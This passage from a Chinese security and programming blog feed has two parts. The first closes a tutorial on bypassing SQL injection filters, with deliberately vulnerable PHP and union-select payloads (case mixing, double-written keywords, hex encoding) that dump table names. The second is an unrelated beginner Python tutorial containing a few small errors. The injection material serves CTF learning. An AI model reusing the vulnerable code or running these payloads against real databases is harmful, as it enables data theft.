<p>在过滤规则中可能存在过滤不完整或者只过滤小写或者大写的情况，没有针对大小写组合进行过滤，导致可以通过大小写混写payload的方式来绕过关键字。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">#漏洞代码示例</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>直接传入<code>select</code>会回显ERROR，当传入<code>SeLeCt</code>时正常回显</p>
<h3 id="双写关键词绕过"><a href="#双写关键词绕过" class="headerlink" title="双写关键词绕过"></a>双写关键词绕过</h3><p>根据应用程序的过滤规则，有时不是直接将关键词加入黑名单，而是利用<code>preg_replace</code>函数将关键词替换</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">#漏洞代码示例</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isser</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>如果直接传入<code>select</code>将会被替换成空而报错，但是<code>preg_replace</code>函数并没有进行多次过滤，导致可以通过双写关键词的方式绕过</p>
<p>当传入<code>seselectlect</code>时，中间的<code>select</code>被替换成空，实际传入的是<code>select</code>，成功绕过</p>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li><p>双重URL编码绕过</p>
</li>
<li><p>十六进制编码绕过</p>
</li>
</ul>
<p>MySQL数据库可以识别十六进制，会对十六进制的数据进行自动转换</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726153906638.png" class="" title="image-20210726153906638" loading="lazy">

<p>如果PHP配置中开启了GPC，GPC会自动会单引号进行转义，这样注入就无法正常使用。</p>
<p>但是如果将注入的数据转换成十六进制，就不需要单引号，可以正常注入</p>
<pre class="language-none"><code class="language-none">#原来传入的注入语句
id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;test&#39;;</code></pre>

<p>进过GPC转义后，SQL语法就会发生错误，不能正常注入</p>
<pre class="language-none"><code class="language-none">#实际传入的注入语句
id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;\&#39;test\&#39;;</code></pre>

<p>利用编码绕过</p>
<pre class="language-none"><code class="language-none">#利用特性将表名十六进制编码后传入，不需要单引号
id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x74657374;</code></pre>

<h3 id="等价函数字符替换绕过"><a href="#等价函数字符替换绕过" class="headerlink" title="等价函数字符替换绕过"></a>等价函数字符替换绕过</h3><ul>
<li>等价等号</li>
</ul>
<p>用<code>like</code>或<code>in</code>代替<code>=</code></p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154407760.png" class="" title="image-20210726154407760" loading="lazy">

<ul>
<li>等价逗号</li>
</ul>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154551164.png" class="" title="image-20210726154551164" loading="lazy">

<ul>
<li><p>等价函数</p>
<p>sleep函数与benchmark函数等价</p>
<p>ascii函数与hex、bin、conv函数等价</p>
<p>group_concat函数与concat_ws函数等价</p>
<p>updatexml函数与extractvalue函数等价</p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web漏洞</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Python</title>
    <url>/2022/04/21/Python/</url>
    <content><![CDATA[<h1 id="Python-特点"><a href="#Python-特点" class="headerlink" title="Python - 特点"></a>Python - 特点</h1><ol>
<li>简单易学</li>
<li>交互式编程</li>
<li>解释性</li>
<li>面对对象</li>
</ol>
<h1 id="Python-基础"><a href="#Python-基础" class="headerlink" title="Python - 基础"></a>Python - 基础</h1><ol>
<li><p>编码</p>
<p>默认情况下，py3源码以UTF-8编码，所有字符都是Unicode字符串</p>
<p>指定不同的编码：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: cp-1252 -*-</span></code></pre>
</li>
<li><p>标识符</p>
<ul>
<li>第一个字符必须是字母表中<code>字母</code>或下划线 <code>_</code>。</li>
<li>标识符的其他的部分由_字母_、_数字_和_下划线_组成。</li>
<li>标识符对<strong>大小写敏感</strong>。</li>
</ul>
<p>注：在py3中，可以用中文等非ASCII标识符</p>
</li>
<li><p>保留字（关键字）</p>
<img src="/2022/04/21/Python/image-20211121123414376.png" class="" loading="lazy">
</li>
<li><p>注释</p>
<ul>
<li><p>单行注释以<code>#</code>开头</p>
</li>
<li><p>多行注释用多个<code>#</code></p>
</li>
</ul>
</li>
<li><p>行与缩进</p>
<p>python以缩进区分行，缩进有问题时会报错</p>
<ul>
<li>python 通常一行写一条语句，如果语句很长可以在尾部加反斜杠<code>\</code>来实现多行语句</li>
<li>在<code>[]</code>、<code>&#123;&#125;</code>、<code>()</code>中的多行语句不需要反斜杠</li>
</ul>
</li>
<li><p>数据类型</p>
<ol>
<li><p>Number（数字）</p>
<ul>
<li><p>int（整型）</p>
</li>
<li><p>bool（布尔型）</p>
</li>
<li><p>float（浮点型）</p>
</li>
<li><p>complex（复数）</p>
</li>
</ul>
</li>
<li><p>String（字符串）</p>
<ul>
<li><p>字符串用单引号<code>&#39;</code>或者双引号<code>&quot;</code>括起来，同时使用反斜杠<code>\</code>转义特殊字符，在字符串添加一个<code>r</code>取消转义</p>
</li>
<li><p>在python中，单引号和双引号的使用基本相同</p>
</li>
<li><p>字符串可以用<code>+</code>连接</p>
</li>
</ul>
</li>
</ol>
<ul>
<li><p>字符串的截取语法格式（包含头不包含尾）：</p>
<blockquote>
<p>变量名[头下标:尾下标]</p>
</blockquote>
</li>
</ul>
</li>
</ol>
<h1 id="Python-运算符"><a href="#Python-运算符" class="headerlink" title="Python - 运算符"></a>Python - 运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>Python 中提供了 7 个基本的算术运算符，与数学方法中基本类似，见下表。（其中 a &#x3D; 3, b &#x3D; 4）</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">名称</th>
<th align="center">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td align="center">加法</td>
<td align="center">a + b &#x3D; 7</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">减法</td>
<td align="center">a - b &#x3D; -1</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">乘法</td>
<td align="center">a * b &#x3D; 12</td>
</tr>
<tr>
<td align="center">&#x2F;</td>
<td align="center">除法</td>
<td align="center">a &#x2F; b &#x3D; 0.75</td>
</tr>
<tr>
<td align="center">%</td>
<td align="center">取模</td>
<td align="center">a % b &#x3D; 3</td>
</tr>
<tr>
<td align="center">**</td>
<td align="center">乘方</td>
<td align="center">a ** b &#x3D; 81</td>
</tr>
<tr>
<td align="center">&#x2F;&#x2F;</td>
<td align="center">整除</td>
<td align="center">a &#x2F;&#x2F; b &#x3D; 0</td>
</tr>
<tr>
<td align="center">b &#x2F;&#x2F; a &#x3D; 1</td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>在 Python 中，允许使用<strong>复合赋值运算符</strong>，包括 <code>+=, -=, *=, /=, %=, **=, //=</code>七种。</p>
<h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2><p>又叫 比较运算符 ，结果是一个布尔值，有 <code>==, !=, &gt;, &lt;, &gt;=, &lt;=</code> 六种。</p>
<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>在 Python 中，逻辑运算符包括 <code>and（与），or（或），not（非）</code> 三种。</p>
<p>但<strong>其返回值不一定是布尔值</strong>！</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">举例</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">and</td>
<td align="center">x and y</td>
<td align="center">如果 x 为 False，无需计算 y 的值，返回 x 的值；否则返回 y 的值</td>
</tr>
<tr>
<td align="center">or</td>
<td align="center">x or y</td>
<td align="center">如果 x 为 True，无需计算 y 的值，返回值为 x；否则返回 y 的值</td>
</tr>
<tr>
<td align="center">not</td>
<td align="center">not x</td>
<td align="center">如果 x 为 True，返回值为 False；否则返回值为 True</td>
</tr>
</tbody></table>
<h2 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h2><p>在 Python 中，成员运算符 用于判断一个元素是否在某个序列中，包括<code>in（存在），not in（不存在）</code> 两种。</p>
<p>返回值是布尔值。</p>
<h2 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h2><p>在 Python 中，身份运算符 用于判断两个变量的引用对象是否指向同一个内存对象5，包括<code>is，is not</code> 两种。</p>
<p>返回值是布尔值。</p>
<h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>指二进制位的运算，包括<code>&amp;（与），|（或），^（取反），~（取反），&lt;&lt;（左移），&lt;&lt;（右移）</code> 六种。</p>
<h1 id="Python-交互语句"><a href="#Python-交互语句" class="headerlink" title="Python - 交互语句"></a>Python - 交互语句</h1><h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p>**input()**方法用于从标准输入读入一行文本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input something: "</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"your input: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">)</span></code></pre>

<h2 id="print"><a href="#print" class="headerlink" title="print"></a>print</h2><p>**print()**方法用于打印输出，基本语法：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token operator">*</span>objects<span class="token punctuation">,</span> sep<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span></code></pre>

<p>objects –表示输出的对象。输出多个对象时，需要用 , （逗号）分隔</p>
<p>sep – 用来间隔多个对象</p>
<p>end – 用来设定以什么结尾。默认值是换行符 \n，我们可以换成其他字符</p>
<p>file – 要写入的文件对象</p>
<ul>
<li><p>无论什么类型的数据都可以直接输出</p>
</li>
<li><p>数据的格式化输出类似于C中的<strong>printf</strong></p>
</li>
<li><p>使用_end_分割字符，默认为换行</p>
</li>
</ul>
<p>**str()<strong>和</strong>repr()**用于将输出的值转成字符串</p>
<h1 id="Python-条件控制语句"><a href="#Python-条件控制语句" class="headerlink" title="Python - 条件控制语句"></a>Python - 条件控制语句</h1><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><p>一般格式：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> condition_1<span class="token punctuation">:</span>
    statement_block_1
<span class="token keyword">elif</span> condition_2<span class="token punctuation">:</span>
    statement_block_2
<span class="token keyword">else</span><span class="token punctuation">:</span>
    statement_block_3</code></pre>

<ul>
<li>每个条件后用冒号<code>:</code>结束</li>
<li>用缩进划分语句块</li>
<li>如果循环体中就一条语句，你可以写在同一行</li>
</ul>
<h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p><strong>python中没有Switch语句</strong></p>
<h1 id="Python-循环控制语句"><a href="#Python-循环控制语句" class="headerlink" title="Python - 循环控制语句"></a>Python - 循环控制语句</h1><h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><p>一般格式：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> condition<span class="token punctuation">:</span>
    statements_block_1
<span class="token keyword">else</span><span class="token punctuation">:</span>
    statements_block_2</code></pre>

<ul>
<li>如果循环体中就一条语句，可以写在同一行</li>
</ul>
<h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><p>一般格式：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> variable <span class="token keyword">in</span> sequence<span class="token punctuation">:</span>
    statements_block_1
<span class="token keyword">else</span><span class="token punctuation">:</span>
    statements_block_2</code></pre>

<ul>
<li>python 中的for循环可以遍历任何可迭代对象，如一个列表或一个字符串</li>
</ul>
<p>**range()**：在循环中使用，用于生成数列</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment"># 0 1 2 3 4</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token comment"># 0 1 2 3 4 5</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment"># 0 3 6 9</span></code></pre>

<h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p><strong>break</strong> 语句可以跳出 for 和 while 的循环体。如果你从 for 或 while 循环中终止，任何对应的循环 else 块将不执行。</p>
<img src="/2022/04/21/Python/image-20211121164015263.png" class="" loading="lazy">

<h2 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h2><p><strong>continue</strong> 语句被用来告诉 Python 跳过当前循环块中的剩余语句，然后继续进行下一轮循环。</p>
<img src="/2022/04/21/Python/image-20211121164057555.png" class="" loading="lazy">

<h1 id="Python-迭代器"><a href="#Python-迭代器" class="headerlink" title="Python - 迭代器"></a>Python - 迭代器</h1><ul>
<li><p>迭代器是访问集合元素的一种方式</p>
</li>
<li><p>迭代器是一个可以记住遍历的位置的对象</p>
</li>
<li><p>迭代器从集合的第一个元素开始访问，直到所有元素被访问完，且只能往前不能后退</p>
</li>
<li><p>两个基本方法：<strong>iter()</strong> 和 <strong>next()</strong></p>
</li>
</ul>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span>it <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>    <span class="token comment"># 创建迭代器对象</span>
<span class="token operator">>></span><span class="token operator">></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 使用next输出迭代器的下一个元素</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token number">2</span>
<span class="token operator">>></span><span class="token operator">></span><span class="token keyword">for</span> x <span class="token keyword">in</span> it <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token comment"># 直接用常规for语句进行遍历</span>
<span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> </code></pre>

<h1 id="Python-列表"><a href="#Python-列表" class="headerlink" title="Python - 列表"></a>Python - 列表</h1><p>类似于C中的数组，用<code>[]</code>定义。</p>
<p>列表可以进行的操作包括_索引_，_切片_，_加_，_乘_，_检查成员_。</p>
<img src="/2022/04/21/Python/image-20211121141040410.png" class="" loading="lazy">

<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>关于列表的一些函数</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>		<span class="token comment"># 列表元素个数</span>
<span class="token builtin">max</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>		<span class="token comment"># 返回列表元素最大值</span>
<span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>		<span class="token comment"># 返回列表元素最小值</span></code></pre>

<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>通过<code>append()</code>方法来添加或者更新项</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'nayst'</span><span class="token punctuation">)</span></code></pre>

<p>通过<code>del()</code>方法来删除项</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span><span class="token punctuation">.</span><span class="token keyword">del</span><span class="token punctuation">(</span><span class="token string">'nayst'</span><span class="token punctuation">)</span></code></pre>

<p>其他方法</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment"># 统计某个元素在列表中出现的次数</span>
<span class="token builtin">list</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment"># 从列表中找出某个值第一个匹配项的索引位置</span>
<span class="token builtin">list</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>			<span class="token comment"># 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</span>
<span class="token builtin">list</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment"># 移除列表中某个值的第一个匹配项</span>
<span class="token builtin">list</span><span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment"># 反向列表中元素</span>
<span class="token builtin">list</span><span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>			<span class="token comment"># 对列表进行排序</span></code></pre>

<h1 id="Python-元组"><a href="#Python-元组" class="headerlink" title="Python - 元组"></a>Python - 元组</h1><p>Python 的元组与列表类似，不同之处在于元组的元素不能修改。</p>
<p>元组使用<code>()</code>定义。</p>
<p>虽然不能修改元组中的元组，但是可以<code>连接元组</code>。</p>
<pre class="language-python" data-language="python"><code class="language-python">tup1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>
tup2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>

tup3 <span class="token operator">=</span> tup1 <span class="token operator">+</span> tup2</code></pre>

<p>与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。</p>
<h1 id="Python-字典"><a href="#Python-字典" class="headerlink" title="Python - 字典"></a>Python - 字典</h1><p>字典用<code>&#123;&#125;</code>定义，由键值对构成。</p>
<p>字典的每个 <code>key=&gt;value</code> （键值对）用冒号 <code>:</code> 分割，每个键值对之间用逗号 <code>,</code> 分割。</p>
<p>字典内的键名不能重复且不可变。</p>
<h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span>		<span class="token comment"># 计算字典中元素个数，即键总数</span>
<span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span>		<span class="token comment"># 将值转化为适于人阅读的形式，以可打印的字符串表示</span></code></pre>

<h2 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">dict</span><span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>					<span class="token comment"># 删除字典内所有元素</span>
<span class="token builtin">dict</span><span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>						<span class="token comment"># 返回一个字典的浅复制</span>
<span class="token builtin">dict</span><span class="token punctuation">.</span>fromkeys<span class="token punctuation">(</span>list1<span class="token punctuation">,</span>list2<span class="token punctuation">)</span>		<span class="token comment"># 创建一个新字典，以序列 list1 中元素做字典的键，list2 为字典所有键对应的初始值</span>
<span class="token builtin">dict</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">,</span>default<span class="token operator">=</span>?<span class="token punctuation">)</span>			<span class="token comment"># 返回指定键的值，如果值不在字典中返回default值</span>
<span class="token builtin">dict</span><span class="token punctuation">.</span>has_key<span class="token punctuation">(</span>key<span class="token punctuation">)</span>				<span class="token comment"># 如果键在字典dict里返回 True，否则返回 False</span>
<span class="token builtin">dict</span><span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span>					<span class="token comment"># 以列表返回可遍历的(键, 值) 元组数组</span>
<span class="token builtin">dict</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>						<span class="token comment"># 以列表返回一个字典所有的键</span>
<span class="token builtin">dict</span><span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span>					<span class="token comment"># 以列表返回字典中的所有值</span></code></pre>

<h1 id="Python-函数"><a href="#Python-函数" class="headerlink" title="Python - 函数"></a>Python - 函数</h1><p>定义函数的规则：</p>
<ol>
<li>函数代码以<code>def</code>关键词开头，后接函数标识符名称和圆括号</li>
<li>任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数</li>
<li>内容以冒号<code>:</code>开始，并且缩进</li>
<li><code>return [表达式]</code>结束函数，不设置默认返回<code>None</code></li>
</ol>
<img src="/2022/04/21/Python/py-tup-10-26-1.png" class="" loading="lazy">

<h1 id="Python-文件"><a href="#Python-文件" class="headerlink" title="Python - 文件"></a>Python - 文件</h1><ol>
<li><p>open</p>
<p>**open()**方法将会返回一个file对象，基本语法：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>mode<span class="token punctuation">)</span>

<span class="token comment"># filename -- 包含了你要访问的文件名称的字符串值。</span>
<span class="token comment"># mode -- 决定了打开文件的模式：只读，写入，追加等。所有可取值见如下的完全列表。这个参数是非强制的，默认文件访问模式为只读(r)。</span></code></pre>

<table>
<thead>
<tr>
<th align="center">mode</th>
<th align="center">describt</th>
</tr>
</thead>
<tbody><tr>
<td align="center">b</td>
<td align="center">二进制模式。</td>
</tr>
<tr>
<td align="center">w</td>
<td align="center">打开一个文件<strong>只用于写入</strong>。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被<strong>覆盖</strong>。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td align="center">r</td>
<td align="center">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td>
</tr>
<tr>
<td align="center">a</td>
<td align="center">打开一个文件用于<strong>追加</strong>。文件的指针将会放在文件的开头。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">以多模式打开。</td>
</tr>
</tbody></table>
</li>
<li><p>read</p>
<p>读取一个文件的内容并作为返回值返回，基本语法：</p>
<pre class="language-python" data-language="python"><code class="language-python">fileObject<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># count -- 要从已打开文件中读取的字节计数。该方法从文件的开头开始读入，如果未给定或为负则读取所有。</span></code></pre>
</li>
<li><p>readline</p>
<p>从文件中读取单独的一行，包括 <code>\n</code> 字符，最后一行默认为空，基本语法：</p>
<pre class="language-python" data-language="python"><code class="language-python">fileObject<span class="token punctuation">.</span>readline<span class="token punctuation">(</span>size<span class="token punctuation">)</span>

<span class="token comment"># size -- 从文件中读取的字节数</span></code></pre>
</li>
<li><p>write</p>
<p>将参数写入到文件中，然后返回写入的字符数</p>
</li>
<li><p>close</p>
<p>关闭文件，刷新缓冲区里任何还没写入的信息，释放系统的资源，不再进行读写操作，基本语法：</p>
<pre class="language-python" data-language="python"><code class="language-python">fileObject<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
</li>
<li><p>tell</p>
<p>返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数。</p>
</li>
</ol>
<h1 id="Python-异常"><a href="#Python-异常" class="headerlink" title="Python - 异常"></a>Python - 异常</h1><ol>
<li><p>try…except</p>
<p>用于捕捉异常</p>
<img src="/2022/04/21/Python/try_except.png" class="" loading="lazy">

<ul>
<li>首先，执行 try 子句（在关键字 try 和关键字 except 之间的语句)。</li>
<li>如果没有异常发生，忽略 except 子句，try 子句执行后结束。</li>
<li>如果在执行 try 子句的过程中发生了异常，那么 try 子句余下的部分将被忽略。如果异常的类型和 except 之后的名称相符，那么对应的 except 子句将被执行。</li>
<li>如果一个异常没有与任何的 except 匹配，那么这个异常将会传递给上层的 try 中。</li>
</ul>
</li>
<li><p>try…else</p>
<p>在 try 没有发生任何异常的时候执行。</p>
<img src="/2022/04/21/Python/try_except_else.png" class="" loading="lazy">
</li>
<li><p>try…finally</p>
<p>无论是否发生异常都将执行最后的代码</p>
<img src="/2022/04/21/Python/try_except_else_finally.png" class="" loading="lazy"></li>
</ol>
<h1 id="Python-面对对象"><a href="#Python-面对对象" class="headerlink" title="Python - 面对对象"></a>Python - 面对对象</h1><ul>
